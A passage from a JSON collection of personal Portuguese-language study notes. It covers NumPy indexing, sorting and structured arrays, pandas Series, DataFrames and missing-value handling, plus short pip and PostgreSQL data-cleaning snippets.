3, 6, 54, 4]\n'''\n\n\n#1\nrainfall = pd.read_csv('C:/Users/pcleu/Documents/Seattle2014.csv')['PRCP'].values\ninches = rainfall / 254\n#2\nprint(inches.shape)\n\n#3\nrainy = (inches > 0)\n#4\nprint(inches[rainy])\n\n#5\nsummer = (np.arange(365) - 172 < 90) & (np.arange(365) -172 < 0)\n\n#6\nprint(f'M\u00e9dia de precip. booleana em dias chuvosos em 2014:\\\n{np.median(inches[rainy])}')\n\n#7\nprint(f'M\u00e9dia de precip. booleana em dia de ver\u00e3o de 2014: \\\n{np.median(inches[summer])}')\n\n#8\nprint(f'M\u00e9dia de precip. booleana em dias chuvosos fora do ver\u00e3o:\\\n{np.median(inches[rainy & ~summer])}')\n\n\nUSANDO OS OPERADORES 'AND/OR'   OU   '&/|'##################################\n######################################################################\nand e or verificam a veracidade do objeto, & e | referece aos bits dentro de cada objeto, \nem python todos o n\u00fameros inteiros diferentes de 0 ser\u00e3o True.\n\nprint(bool(42), bool(0))\nTrue False\n\nprint(bool(42 and 0))\nFalse\n\nprint(bool(42 or 0))\nTrue\n\n\n\n\n\n"}, "Numpy - Indexa\u00e7\u00e3o sofisticada": {"categoria": "python ciencia de dados handbook", "codigo": "EXPLORANDO INDEXA\u00c7\u00c3O SOFISTICADA #######################################\n######################################################################\nimport numpy as np\nimport pandas as pd\nimport matplotlib.pyplot as plt\n'''\n1# Fazemos uma matriz com n\u00fameros aleat\u00f3rios de 0 a 100 de \n10 valores de tamanho linear\n\n2# 'x[3]' \u00e9 a posi\u00e7\u00e3o 3 na matriz linear 'x'. O x[3]\nesta dentro de [] pois retornar\u00e1 uma lista\n\n3# Podemos passar os indices dentro de uma lista.\n\n4# Podemos passar os indices em forma de array, \ndessa forma os n\u00fameros que correspondem ao indice \nposicional ser\u00e3o evidenciados j\u00e1 no formata da matriz\nde indices\n\n5# Fazemos uma matriz linear de 12 n\u00fameros de 0 auto\nincremental, ou seja 0 a 11, e usamos o reshape para\n3 x 4\n\n6# Quando a matriz tem v\u00e1rias linhas, temos que passar a coordenada,\nx1[linha, coluna], x1[0, 2], linha 0 e coluna 2\n\n7# row[:, np.newaxis], transforma a matriz [n, n, n], 1x3(1 linha X 3 col\nem  uma matriz 3x1(3 linhas e uma coluna). Tranforma linha em coluna.\nCada valor do do 'col' ser\u00e1 multiplicado pelo valor do 'row'\nou seja \n0 * [2, 1, 3] = 0 0 0\n1 * [2, 1, 3] = 2 1 3\n2 * [2, 1, 3] = 4 2 6\n'''\nrand = np.random.RandomState(42)\n\n#1\nx = rand.randint(100, size=10)\n#[51 92 14 71 60 20 82 86 74 74]\n\n\n#2\nprint([x[3], x[7], x[2]])\n\n#3\nind = [3, 7, 4]\nprint(x[ind])\n\n#4\nind1 = np.array([[3, 7],\n\t\t\t\t[4, 5]])\nprint(x[ind1])\n\n#5\nx1 = np.arange(12).reshape((3, 4))\n'''\n[[ 0  1  2  3]\n [ 4  5  6  7]\n [ 8  9 10 11]]\n'''\nprint(x1)\n\n#6\nrow = np.array([0, 1, 2])\ncol = np.array([2, 1, 3])\nprint(x1[row, col])\n\n#7\nprint(row[:, np.newaxis] * col)\n\n\n\n\nINDEXA\u00c7\u00c3O COMBINADA ################################################\n#####################################################################\n\nimport numpy as np\nimport pandas as pd\nimport matplotlib.pyplot as plt\n'''\n1# Criamos uma matriz de 12 n\u00fameros de 0 incremental, 3x4,\n3 linhas e 4 colunas.\n\n2# Na matriz 'x' selecionamos linha 2, e na linhas dois, selecionamos\nas colunas 2, 0, 1.\n\n3# Na matriz 'x' selecionamos todas as linhas depois da linha '1', \ninclui a linha 1, e em cada linha selecionada selecionamos as \ncolunas 2, 0, 1.\n\n4# np.newaxis, tranforma array linha em coluna, o row(0, 1, 2) viram \nos indices da linha e o mask \u00e9 booleana, sendo assim ser\u00e1 selecionado\napenas os n\u00fameros que estiverem na posi\u00e7\u00e3o True\nmask =\t[1, \t0, \t\t1, \t\t0]\nlinha 0 [True, False, True, False] = 0, 2\nlinha 1 [True, False, True, False] = 4, 6\nlinha 2 [True, False, True, False] = 8, 10\n\n'''\n\n#1\nx = np.arange(12).reshape(3, 4)\n'''\n[[ 0  1  2  3]\n [ 4  5  6  7]\n [ 8  9 10 11]]\n '''\n\n#2\nprint(x[2, [2, 0, 1]])\n'''\n[10  8  9]\n'''\n\n#3\nprint(x[1:, [2, 0, 1]])\n'''\n[[ 6  4  5]\n[10  8  9]]\n'''\n\nmask = np.array([1, 0, 1, 0], dtype=bool)\nrow = np.array([0, 1, 2])\ncol = np.array([2, 1, 3])\n\n#4\nprint(x[row[:, np.newaxis], mask])\n'''\n[[ 0  2]\n [ 4  6]\n [ 8 10]]\n'''\n\nMOSTRANDO PONTOS DE DISTRIBUI\u00c7\u00c3O COORDENADA(X=COLUNA_0, Y=COLUNA_1)####\n######################################################################\n\nimport numpy as np\nimport pandas as pd\nimport matplotlib.pyplot as plt\n'''\n1# selecionada todas as linhas da coluna 0\ne selecionada todas as linhas da coluna 1\nscatter faz um gr\u00e1fico de distribui\u00e7\u00e3o, onde\n(x, y), cada valor da coluna 0 ser\u00e1 o 'x' e\ncada valor da coluna 1 ser\u00e1 o 'y'.\n\n'''\n\nrand = np.random.RandomState(42)\n\n\nmean = [0, 0]\ncov = [[1, 2],\n\t\t[2, 5]]\n\nx = rand.multivariate_normal(mean, cov, 100)\nprint(x)\nprint(x.shape)\n\n#1\nplt.scatter(x[:, 0], x[:, 1])\nplt.show()\n\nMODIFICANDO VALORES COM INDEXA\u00c7\u00c3O SOFISTICADA##########################\n#####################################################################\nimport numpy as np\nimport pandas as pd\nimport matplotlib.pyplot as plt\n\n'''\nOs valores ques est\u00e3o n\u00e3o na posi\u00e7\u00e3o [2, 1, 8, 4],\nagora s\u00e3o iguais a 99\n'''\n\nx = np.arange(10)\nindices = np.array([2, 1, 8, 4])\n\nx[indices] = 99\nprint(x)\nx[indices] -= 10\nprint(x)\n\n\n\nEXEMPLO DE BINNIG DATA, GR\u00c1FICO STEP #####################################\n#####################################################################\nimport numpy as np\nimport matplotlib.pyplot as plt\n\n'''\nx = [dados]\nbins = [regua do eixo 'x'] 20 n\u00famero igualmente separados de -5 a 5\nconta quantas vezes o dado caiu na mesma posi\u00e7\u00e3o.\n\n'''\n\nnp.random.seed(42)\nx = np.random.randn(100)#array de 100 valores\n'''[ 0.49671415 -0.1382643   0.64768854  1.52302986 -0.23415337 -0.23413696\n  1.57921282  0.76743473 -0.46947439  0.54256004 -0.46341769 -0.46572975\n  0.24196227 -1.91328024 -1.72491783 -0.56228753 -1.01283112  0.31424733\n -0.90802408 -1.4123037   1.46564877 -0.2257763   0.0675282  -1.42474819\n -0.54438272  0.11092259 -1.15099358  0.37569802 -0.60063869 -0.29169375\n -0.60170661  1.85227818 -0.01349722 -1.05771093  0.82254491 -1.22084365\n  0.2088636  -1.95967012 -1.32818605  0.19686124  0.73846658  0.17136828\n -0.11564828 -0.3011037  -1.47852199 -0.71984421 -0.46063877  1.05712223\n  0.34361829 -1.76304016  0.32408397 -0.38508228 -0.676922    0.61167629\n  1.03099952  0.93128012 -0.83921752 -0.30921238  0.33126343  0.97554513\n -0.47917424 -0.18565898 -1.10633497 -1.19620662  0.81252582  1.35624003\n -0.07201012  1.0035329   0.36163603 -0.64511975  0.36139561  1.53803657\n -0.03582604  1.56464366 -2.6197451   0.8219025   0.08704707 -0.29900735\n  0.09176078 -1.98756891 -0.21967189  0.35711257  1.47789404 -0.51827022\n -0.8084936  -0.50175704  0.91540212  0.32875111 -0.5297602   0.51326743\n  0.09707755  0.96864499 -0.70205309 -0.32766215 -0.39210815 -1.46351495\n  0.29612028  0.26105527  0.00511346 -0.23458713]'''\n\nbins = np.linspace(-5, 5, 10)#20 numeros espa\u00e7ado igais entre -5 e 5\n'''[-5.         -4.47368421 -3.94736842 -3.42105263 -2.89473684 -2.36842105\n -1.84210526 -1.31578947 -0.78947368 -0.26315789  0.26315789  0.78947368\n  1.31578947  1.84210526  2.36842105  2.89473684  3.42105263  3.94736842\n  4.47368421  5.        ]'''\n\n\n\nplt.hist(x, bins, histtype='step')\nplt.show()\n\n\n"}, "backup de todas as bibliotecas e recupera\u00e7\u00e3o das bibliotecas em python": {"codigo": "1) Abra o cmd e digite: ]\n- pip freeze > requirements.txt\n\n2) Procure o arquivo na barra de pesquisa do window ou tu pode especificar o destino logo aqui.\n3) Passe esse arquivo para o computador novo e execute o seguinte c\u00f3digo:\n- Navegue at\u00e9 a pasta de que o arquivo est\u00e1: \n\n- cd C:\\Users\\SeuUsuario\\Desktop\n- pip install -r requirements.txt\n\n4) Ou tu pode colocar o diret\u00f3rio logo no segundo c\u00f3digo.\n", "categoria": "Python Geral"}, "NumPy - Ordenando e classificando matrizes": {"categoria": "python ciencia de dados handbook", "codigo": "NP.SORT(X) / X.SORT() / NP.ARGSORT(X) #######################################\n######################################################################\nimport numpy as np\nimport matplotlib.pyplot as plt\n'''np.sort(x) e x.sort() s\u00e3o a mesma coisa.\n\n\n'''\n\nx = np.array([2, 1, 4, 3, 5])\ni = np.argsort(x)#retorna os \u00edndices dos elementos ordenados\n\nxs = np.sort(x) #cria um array novo\nx.sort() #modifica o array original\n\nprint(xs)\nprint(x) \nprint(i) \n\n\nORDENANDO LINHAS E COLUNAS ############################################\n######################################################################\nimport numpy as np\nimport matplotlib.pyplot as plt\n\nrand = np.random.RandomState(42)\nx = rand.randint(0, 10, (4, 6))\n'''\n[[6 3 7 4 6 9]\n [2 6 7 4 3 7]\n [7 2 5 4 1 7]\n [5 1 4 0 9 5]]\n'''\n\nprint(np.sort(x, axis=0)) #ordena cada coluna\nprint(np.sort(x, axis=1)) #ordena cada linha\n\n\nORDENAMENTOS PARCIAIS #############################################\n##################################################################\nimport numpy as np\nimport matplotlib.pyplot as plt\n'''\nRetorna um araay que at\u00e9 o indice 3, \ncont\u00e9m os tr\u00eas menores valores, n\u00e3o necess\u00e1riamente\nest\u00e3o em ordem, o resto dos n\u00fameros do array\nn\u00e3o est\u00e3o em ordem\n\n'''\nx = np.array([7, 2, 3, 1, 6, 5, 4])\nprint(np.partition(x, 3))\n\n\nORDENAMENTOS PARCIAIS EM MATRIZES MULTIDIMENSIONAIS#####################\n#####################################################################\nimport numpy as np\nimport matplotlib.pyplot as plt\n'''\nRetorna um array que at\u00e9 o \u00edndice 2,\ncont\u00e9m os 3 menores valores, n\u00e3o necessariamente\nest\u00e3o em ordem, o retor dos n\u00fameros do array\nn\u00e3o est\u00e3o em ordem, o c\u00f3digo abaixo, isso \nacontece por cada linha, se quisesse por coluna\napenas trocar o '1' po '0'\n'''\n\nrand = np.random.RandomState(42)\nx = rand.randint(0, 10, (4, 6))\n\nprint(np.partition(x, 2, axis=1))\n\nLIGANDO PONTO MAIS PR\u00d3XIMO, ORDENANDO MATRIZES COM BASE EM SEU VALORES \nE RETORNANDO \u00cdNDICES###################################################\nimport numpy as np\nimport matplotlib.pyplot as plt\n\n#1\nrand = np.random.RandomState(42)\nx = rand.rand(10, 2)\n\n'''\n[[0.37454012 0.95071431]\n [0.73199394 0.59865848]\n [0.15601864 0.15599452]\n [0.05808361 0.86617615]\n [0.60111501 0.70807258]\n [0.02058449 0.96990985]\n [0.83244264 0.21233911]\n [0.18182497 0.18340451]\n [0.30424224 0.52475643]\n [0.43194502 0.29122914]]\n'''\n#2\ncol = x[:, np.newaxis, :]\nlin = x[np.newaxis, :, :]\n\na = (col - lin)**2\n\n#3\ndistancia_quadratica = np.sum(a, axis =-1)\n\n#4\nnearest_partition = np.argpartition(distancia_quadratica, 3, axis=1)\n'''\n[[3 0 4 5 8 9 1 7 2 6]\n [1 4 6 9 3 5 2 7 8 0]\n [2 7 9 8 6 4 5 1 3 0]\n [3 5 0 8 4 1 6 7 2 9]\n [1 4 0 8 9 6 2 7 5 3]\n [5 3 0 8 4 1 6 7 2 9]\n [1 9 6 4 3 5 2 7 8 0]\n [7 2 9 8 6 4 5 1 3 0]\n [8 9 4 7 2 3 0 1 5 6]\n [8 7 9 2 1 6 4 5 3 0]]\n'''\n#5\nplt.scatter(x[:,0], x[:,1])\n\n#6\nfor i in range(x.shape[0]):\n\tfor j in nearest_partition[i, :3]:\n\t\tprint(j)\n\t\tplt.plot(*zip(x[j], x[i]))\nplt.show()\n\n\n\n"}, "NumPy - Estruturando dados com estruturas de matrizes": {"codigo": "ESTRUTURANDO OS DADOS #############################################\n##################################################################\n\nimport numpy as np\n'''\n#1 np.zeros cria um array com itens sem valor, quatro conjuntos de\nitens, se n\u00e3o tivesse especificado o dic, seria [0, 0, 0, 0]\nmas como especificou fica assim:\n[('', 0, 0.), ('', 0, 0.), ('', 0, 0.), ('', 0, 0.)]\ne ao usar o data['name'] colocar todos os nomes em seus lugares.\n\n'''\n\nname = ['alice', 'bob', 'cathy', 'doug']\nage = [25, 45, 37, 19]\nweight = [55.0, 85.5, 68.0, 61.5]\n\n#1\ndata = np.zeros(4, dtype={'names':('name', 'age', 'weight'),\n\t'formats':('U10', 'i4', 'f8')})\n\n''' [('', 0, 0.) ('', 0, 0.) ('', 0, 0.) ('', 0, 0.)] '''\n\ndata['name'] = name\ndata['age'] = age\ndata['weight'] = weight\n\n'''[('alice', 25, 55. ) ('bob', 45, 85.5) ('cathy', 37, 68. )\n ('doug', 19, 61.5)]'''\n\nprint(data[data['age'] < 30]['name'])\n\n\n#####################################################################\nimport numpy as np\n\ndados0 = np.dtype({'names':('name', 'age', 'weight'),\n\t'formats':('U10', 'i4', 'f8')})\n\t\ndados1 = np.dtype({'names':('name', 'age', 'wieght'),\n\t'formats':((np.str_, 10), int, np.float32)})\n\ndados2 = np.dtype([('name', 'S10'), ('age', 'i4'), ('weight', 'f8')])\n\ndados3 = np.zeros(4, dtype={'names':('name', 'age', 'wieght'),\n\t'formats':('U10', 'i4', 'f8')})\nprint(dados0)\nprint(dados1)\nprint(dados2)\nprint(dados3)\n\n\n\n\n'b' \tByte \t\tnp.dtype('b')\n 'i' \tSigned integer \t\tnp.dtype('i4') == np.int32\n 'u'\t Unsigned integer\t np.dtype('u1') == np.uint8 \n'f' \tFloating point \t\tnp.dtype('f8') == np.int64 \n'c'\tComplex \u0082oating point \tnp.dtype('c16') == np.complex128\n'S', 'a' \tstring\t\t np.dtype('S5') \n'U' \tUnicode string \tnp.dtype('U') == np.str_ \n'V' \tRaw data (void) \tnp.dtype('V') == np.void\n\n\n\n#####################################################################\nimport numpy as np\n\n'''\nPrimeiro criamos as especifica\u00e7\u00f5es dos dados, em seguida\ncriamos um array 0s com id e mat, \ndados[0] = primeira linha completa\ndados['mat'][0] = coluna mat, primeira linha\n'''\n\n\ntp = np.dtype([('id', 'i8'), ('mat', 'f8', (3, 3))])\ndados = np.zeros(1, dtype=tp)\nprint(dados[0])\nprint(dados['mat'][0])\n", "categoria": "python ciencia de dados handbook"}, "Pandas - Series Object, indexador de dados": {"codigo": "SERIES COMO ARRAY ##############################################\n##############################################################\n\nimport numpy as np\nimport pandas as pd\n\ndata = pd.Series([0.25, 0.5, 0.75, 1.0])\n\nprint(data, '\\n') #nistra tabeka\nprint(data.values, '\\n') #mostra apenas os valores\nprint(data.index, '\\n') #mostra apenas os \u00edndices\nprint(data[1], '\\n') #mostra a linha 1\nprint(data[1:3], '\\n') #mostra a linha 1 a linha 3\n\n\ndata = pd.Series([0.25, 0.5, 0.75, 1.0], index=['a', 'b', 'c', 'd'])\nprint(data)\nprint(data['b'])\n\ndata = pd.Series([0.25, 0.5, 0.75, 1.0], index=[2, 5, 3, 7])\nprint(data)\nprint(data[5])\n\n\nSERIES COMO COMO DICION\u00c1RIO ###########################################\n######################################################################\n\n\nimport numpy as np\nimport pandas as pd\n\npopulation_dict = {'California': 38332521,\n\t'Texas':26448193,\n\t'New York': 196551127,\n\t'Florida': 19552860,\n\t'Illinois': 12882135}\n\npopulation = pd.Series(population_dict)\nprint(population, '\\n') #tabela\nprint(population['California'], '\\n') #Mostra n\u00famero\nprint(population['California':'Illinois'], '\\n') #mostra de onde at\u00e9 onde\n\n\nCONSTRUINDO SERIES OBJECT ##############################################\n####################################################################\nimport numpy as np\nimport pandas as pd\n\ndados = pd.Series([2, 4, 6])\ndados1 = pd.Series(5, index=[100, 200, 300])\ndados2 = pd.Series({2:'a', 1:'b', 3:'c'})\ndados3 = pd.Series({2:'a', 1:'b', 3:'c'}, index=[3, 2])\n\nprint(dados)\nprint(dados1)\nprint(dados2)\nprint(dados3)", "categoria": "python ciencia de dados handbook"}, "Pandas - DataFrame Obect": {"codigo": "JUNTANDO DADOS EM APENAS UMA TABELA USANDO O INDEX##################\n###################################################################\n\nimport pandas as pd\nimport numpy as np\n\n#Dados\narea_dict = {'California': 423967, 'Texas': 695662, 'New York': 141297,\n'Florida': 170312, 'Illinois': 149995}\n\npopulation_dict = {'California': 38332521,'Texas': 26448193,'New York': 19651127,\n'Florida': 19552860,'Illinois': 12882135}\n\n\n#Tabela\narea = pd.Series(area_dict)\npopulation = pd.Series(population_dict)\n\n\n#Jun\u00e7\u00e3o\nestados = pd.DataFrame({'Population': population,\n\t'area': area})\nestados0 = pd.DataFrame(population, columns=['population'])\n\t\nprint(estados) #tabela completa\nprint(estados.index) #junta as duas base de dados\nprint(estados.columns) #nome das colunas\nprint(estados['area']) #mostra apenas essa coluna\nprint(estados0)\n\ndata = [{'a':i, 'b':2*i} for i in range(3)]\nprint(pd.DataFrame(data))\n\n\nprint(np.random.rand(3,2))\n'''\nPodemos passar uma rray de 3 linhas e 2 colunas\nespecificando o que a primeira coluna \u00e9 e o que \na segunda linha \u00e9, podemos especificar o que \u00e9 o\nindice\n'''\ncoord =pd.DataFrame(\n\tnp.random.rand(3, 2), \n\tcolumns=['x', 'y'], \n\tindex=['a', 'b', 'c'])\n\t\nprint(coord)\n\n\na = np.zeros(3, dtype=[('A', 'i8'), ('B', 'f8')])\ndados = pd.DataFrame(a)\nprint(dados)\n\n", "categoria": "python ciencia de dados handbook"}, "Pandas - Indexa\u00e7\u00e3o de objeto": {"categoria": "python ciencia de dados handbook", "codigo": "#JUNTANDO INDICES ######################################################\n#######################################################################\n\n\nimport numpy as pd\nimport pandas as pd\n\nind = pd.Index([2, 3, 5, 7, 11])\nprint(ind[1]) #numero 3\nprint(ind[::2]) #Seleciona dos os dados de 2 a 2.\n#Tamanho, shape, numero dimens\u00f5es, e tipo\nprint(ind.size, ind.shape, ind.ndim, ind.dtype)\n\nindA = pd.Index([1, 3, 5, 7, 9])\nindB = pd.Index([2, 3, 5, 7, 11])\n\ninterseccao = indA & indB\ninterseccao = indA.intersection(indB)\n\nuniao = indA | indB\nuniao = indA.union(indB)\n\ndiferenca_ordenada = indA ^ indB\n\nprint(interseccao)\nprint(uniao)\nprint(diferenca_ordenada)\n\n\nINDEXANDO DADOS E SELECIONANDO #######################################\n#####################################################################\n\nimport pandas as pd\ndata = pd.Series([0.25, 0.5, 0.75, 1.0], index = ['a', 'b', 'c', 'd'])\n\n\nprint('a' in data) #True\nprint(data.keys()) #Todos os index\nprint(list(data.items()))#tuplas com indice valor\n\ndata['e'] = 1.25 #Podemos adicionar com o \u00eddice\nprint(data) #Mostra o valor adicionado\nprint(data['a':'c']) #Seleciona do index 'a' ao 'c'\nprint(data[0:2]) #Seleciona do indice 0 ao 2\nprint(data[(data > 0.3) & (data < 0.8)]) #Seleciona\nprint(data[['a', 'e']]) #Seleciona pelo indice, varios dados\nprint(data[0:2]) #Do \u00edndice 0 ao 2\nprint(data[(data > 0.3) & (data < 0.8)]) #Selecionando por maior menor\n\n\ndata1 = pd.Series(['a', 'b', 'c'], index=[1, 3, 5])\n'''\nA diferen\u00e7a aqui \u00e9 que:\n- data1[1] acessa o dado que est\u00e1 com \no \u00edndice na posi\u00e7\u00e3o 1.\n- data.loc[1] acessa o dados que tem o \u00edndice\nde valor 1, n\u00famero que o \u00edndice carrega, n\u00e3o a sua posi\u00e7\u00e3o\n\n'''\nprint(data1[1]) #posi\u00e7\u00e3o se o indice for str, numero do \u00edndice se for int\nprint(data1.loc[1]) #apenas nome\n\n"}, "Pandas - Sele\u00e7\u00e3o de dados no dataframe()": {"codigo": "import pandas as pd\n\narea = pd.Series({'California': 423967, 'Texas': 695662,\n'New York': 141297, 'Florida': 170312, 'Illinois': 149995})\n\npop = pd.Series({'California': 38332521, 'Texas': 26448193,\n'New York': 141297, 'Florida': 19552860, 'Illinois': 12882135})\n\ndata = pd.DataFrame({'Area': area, 'pop':pop})\n\nprint(data) #Mostra a tabela\nprint(data['Area']) #Mostra apenas a coluna\nprint(data.Area) #Mostra igualmente apenas a coluna\nprint(data.Area is data['Area']) #Verifica se n\u00e3o iguais 'True'\nprint(data.pop is data['pop']) #Entra em conflito como pop e pop\ndata['densidade'] = data['pop'] / data['Area']\nprint(data)\nprint(data.values) #Mostras os dados em array [area, pop, densidade]\nprint(data.T) #Troca linha por coluna\nprint(data.values[0]) #acessamos uma linha, n\u00e3o o indice, porque nesse\n#caso \u00e9 um array bidimencional\nprint(data['densidade'])\nprint(data.iloc[:3, :2]) #Acessamos 0 a 3 linhas e 0 a 2 colunas do dataframe\nprint(data.loc[:'Illinois', :'pop']) #Linha at\u00e9 Illinois na coluna pop do\n#dataframe\nprint(data.loc[data.densidade > 100, ['pop', 'densidade']])\ndata.iloc[0, 2] = 90 #Linha 0 e coluna 2 = 90\nprint(data)\nprint(data['Florida': 'Illinois']) #Mostra alinha Florida e Illinois\nprint(data[1:3]) #Seleciona 0,1 linha e 0,1,2 coluna\n", "categoria": "python ciencia de dados handbook"}, "Pandas - Operacoes com Series e Matrizes": {"categoria": "python ciencia de dados handbook", "codigo": "PRESERVA\u00c7\u00c3O DA INDEXA\u00c7\u00c3O ##############################################\n######################################################################\n\nimport pandas as pd\nimport numpy as np\n\nrgn = np.random.RandomState(42)\n\nser = pd.Series(rgn.randint(0, 10, 4))\n\ndf = pd.DataFrame(rgn.randint(0, 10, (3, 4)),\n\tcolumns = ['A', 'B', 'C', 'D'])\nprint(df)\nprint(np.exp(ser)) #Eleva e mant\u00eam o \u00edndice\nprint(np.sin(df*np.pi / 4)) '''Pegamos o dataframe multiplicamos por\npi, dividimos por 4 e tiramos o seno de cada item do dataframe, igual\nem matrizes'''\n\nOPERA\u00c7\u00d5ES COM DADOS FALTANTES #######################################\n####################################################################\n\nimport pandas as pd\nimport numpy as np\n'''\n- Quando dividimos uma coluna por outra coluna, onde os \u00edndices est\u00e3o \nfaltando apara NAN, ou seja, onde n\u00e3o tinha. \n- Podemos colocar os nomes\ndas colunas depois de inserir o dicion\u00e1rio de dados, tab\u00e9m funciona,\n- Usamos o uniono para unir \u00edndice combinados, o seja 1, 3, 5 +\n2, 4 = 1, 2, 3, 4, 5.\n'''\n\narea = pd.Series({'Alaska': 1723337, 'Texas': 695662, 'California': 423967}, name='area')\n\npopulation = pd.Series({'California': 38332521, 'Texas': 26448193,\n'New York': 19651127}, name='population')\n\nprint(population / area)\n#area.index | population.index\ncombined_index = area.index.union(population.index)\nprint(combined_index)\n\n\nA = pd.Series([2, 4, 6], index=[0, 1, 2])\nB = pd.Series([1, 3, 5], index=[1, 2, 3])\nprint(A+B)\nprint(A.add(B, fill_value=0))\n\n\n\nOPERA\u00c7\u00d5ES COM DADOS FALTANTES, POR\u00c9M INTRODUZINHO A M\u00c9DIA DE TODOS OS DADOS\nONDE FALTA PARA FAZER AS CONTAS##########################################\n######################################################################\n\nimport pandas as pd\nimport numpy as np\n'''\nA+B, por\u00e9m o data freme A \u00e9 (2,2) e o B \u00e9 (3, 3)\nisso vai fazer opera\u00e7\u00f5es onde A n\u00e3o existe e B exista,\nusamos o A.stack().mean() para calcular a m\u00e9dia de todo o data frame\ne usamdo o A.dd(B, fill_value = fill) iss significa que enchemos os dados\nque faltam com a m\u00e9dia de todos os dados j\u00e1 calculados anteriormente\n'''\nrng = np.random.RandomState(42)\n\nA = pd.DataFrame(rng.randint(0, 20, (2, 2)), columns=list('AB'))\nB = pd.DataFrame(rng.randint(1, 10, (3, 3)), columns=list('BAC'))\n\nprint(A)\nprint(B)\nprint(A+B)\n\nfill = A.stack().mean()\nprint(A.add(B, fill_value=fill))\n\n\n\n\n\n\n\t\nPython operator \tPandas method(s) \n+ \t\tadd() \n- \t\tsub(), subtract() \n* \t\tmul(), multiply() \n/ \t\ttruediv(), div(), divide() \n// \t\tfloordiv() \n% \t\tmod() \n**\t\tpow()\n"}, "Pandas - Opera\u00e7\u00f5es entre Series e Dataframes": {"codigo": "import pandas as pd\nimport numpy as np\n\n'''\n#1 Diminui a matriz por pela linha [0], matriz de mesmo tamanho, \ntodos os pontos s\u00e3o diminuidos justapostamente, por\u00e9m para cada linha\n#2 Data frame \u00e9 igual a Matriz, informamos que a coluna \u00e9 a lista\nQRST\n#3 Diminui o dataframe pelinha do [0] do dataframe, subtrai igual uma\nmatriz no numpy, por\u00e9m agora as colunas tem nomes, e a subtra\u00e7\u00e3o levar\u00e1\nem conta o nome das colunas, ou seja, coluna A. - coluna A..\n#4 Faz um array com a primeira linha todas a colunas contadas de 2 a 2,\nresultando em [6, 7], por\u00e9m essas colunas continuam como nomes, \ne quando somadas o 6 por exemplo ser\u00e1 somado linha a linha apenas na coluna\nQ e o 7 com a coluna R.\n\n\n\n'''\n\nrng = np.random.RandomState(42)\nA = rng.randint(10, size=(3, 4))\nprint(A)\n'''\n[[6 3 7 4]\n [6 9 2 6]\n [7 4 3 7]]\n'''\n#1\nprint(A - A[0])\n'''\n[[ 0  0  0  0]\n [ 0  6 -5  2]\n [ 1  1 -4  3]]\n'''\n\n#2\ndf = pd.DataFrame(A, columns=list('QRST'))\n'''\n   Q  R  S  T\n0  6  3  7  4\n1  6  9  2  6\n2  7  4  3  7\n'''\n\n#3\nprint(df - df.iloc[0])\n'''\n   Q  R  S  T\n0  0  0  0  0\n1  0  6 -5  2\n2  1  1 -4  3\n'''\n\n#4\nhalfrow = df.iloc[0, ::2]\nprint(halfrow)\n'''\nQ    S\n6    7\n'''\n\n#5\nprint(df - halfrow)\n\n\n\n", "categoria": "python ciencia de dados handbook"}, "Pandas - Tratamento de dados ausentes": {"categoria": "python ciencia de dados handbook", "codigo": "NONE / NAN - FALTA DE DADOS EM OPERA\u00c7\u00d5ES #############################\n###################################################################\n\nimport numpy as np\nimport time\n'''\nO valor None, quando colocado em opera\u00e7\u00f5es, ele gera error,\no valor nan, quando colocando em opera\u00e7\u00f5es ele n\u00e3o gera error,\nmas o resultado sempre ser\u00e1 um ponto-flutuante nan.\nPara fazer a conta, precisamos usar o np.nansum(vals2) para somar\nos valores e ignorar os nan\n'''\n\nvals1 = np.array([1, None, 3, 4])\n\nfor dtype in ['object', 'int']:\n    print('dtype =', dtype)\n    \n    start_time = time.time()\n    np.arange(1E6, dtype=dtype).sum()\n    end_time = time.time()\n    \n    print(f\"Execution time: {end_time - start_time:.6f} seconds\")\n\n#vals1.sum()\nvals2 = np.array([1, np.nan, 3, 4])\nprint(vals2.dtype)\nprint(1+np.nan)\nprint(0*np.nan)\nprint(vals2.sum(), vals2.min(), vals2.max())\n\nprint(np.nansum(vals2), np.nanmin(vals2), np.nanmax(vals2))\n\n\n\nDADOS AUSENTES NO PANDAS ############################################\n#####################################################################\nimport numpy as np\nimport pandas as pd\n'''\n1# O Pandas classifica automaticamente o np.nan e o None.\n2# O pandas classifica o None como nan e repare que os outros \nn\u00fameros da coluna fica em float, pois o nan \u00e9 numero flutuante,\nse for objeto ou j\u00e1 flutuante os tipos de valores .\n\n'''\n\n#1 \ndados = pd.Series([1, np.nan, 2, None])\nprint(dados)\n\nx = pd.Series(range(2), dtype=int)\nprint(x)\n#2\nx[0] = None\nprint(x)\n\n"}, "Pandas operando e valores nulos": {"codigo": "ESTRUTURA DO PANDAS ################################################\n#####################################################################\n\nisnull() Gera uma mascara booleana indicando valores ausentes.\nnotnull() Gera uma mascar booleana indicando valores n\u00e3o ausentes.\ndropna() Retorna uma ver\u00e3o filtrada dos dados.\nfillna() Retorna uma copia dos dados com os dados filtrados ou colocados\n\nDETECTANDO VALORES NULOS ############################################\n#####################################################################\n\nimport numpy as np\nimport pandas as pd\n\n\n#1 isnull() notnull()\ndata = pd.Series([1, np.nan, 'hello', None])\nprint(data.isnull())\nprint(data[data.notnull()]) #seleciona apenas os valores n\u00e3o nulot\n\n#2 dropnull = Desconsidera as linhas que tenha nan\n#ou desconsidera as colunas que tem nan\ndf = pd.DataFrame([[1, np.nan, 2],\n\t\t\t\t\t[2, 3, 5],\n\t\t\t\t\t[np.nan, 4, 6]])\nprint(df)\nprint(df.dropna())\n\nprint(df.dropna(axis='columns'))\n\n\n#Coluna 3 inteira os valores s\u00e3o igual a np.nan\ndf[3] = np.nan\nprint(df)\n\n\n#Voc\u00ea est\u00e1 dizendo para manter as linhas que tenham \n#pelomenos 3 valores n\u00e3o nulos\nprint(df.dropna(axis='rows', thresh=3))\n\n\nPREENCHENDO VALORES NULOS ############################################\n######################################################################\n\nimport numpy as np\nimport pandas as pd\n\n\ndata = pd.Series([1, np.nan, 2, None, 3], index=list('abcde'))\nprint(data)\n\n#preenche os dados faltantes com 0\ndata_preenchido = data.fillna(0)\nprint(data_preenchido)\n\n#Preenche os dados faltantes com o dado da linha anterior\ndata_preenchido1 = data.fillna(method='ffill')\nprint(data_preenchido1)\n\n", "categoria": "python ciencia de dados handbook"}, "limpando dados": {"codigo": "COPY sua_tabela (coluna_valor) \nFROM '/caminho/para/arquivo.csv'\nWITH (FORMAT csv, HEADER true, DELIMITER ',');\n\nUPDATE sua_tabela\nSET coluna_valor = REPLACE(coluna_valor, '$', '')::numeric;\n", "categoria": "SQL "}, "Pandas - MultIndex - hierarquia e dimens\u00e3o": {"codigo": 